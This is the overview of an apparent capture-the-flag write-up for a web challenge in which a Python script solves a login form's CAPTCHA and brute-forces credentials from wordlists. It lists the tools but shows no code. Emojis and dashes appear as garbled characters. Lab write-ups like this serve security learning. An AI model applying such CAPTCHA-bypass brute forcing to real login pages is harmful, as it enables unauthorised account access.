## ЁЯУЛ Overview

Capture is a web challenge involving brute-forcing a login form that is protected by a **CAPTCHA** тАФ but the CAPTCHA can be solved programmatically. You'll write a Python script to automate the login process, solving the CAPTCHA and brute-forcing credentials.

---

## ЁЯФз Tools Used

- Python (requests library) тАФ Custom brute-force script
- Browser / Burp Suite тАФ Understanding the login form
- Wordlists тАФ Username and password lists

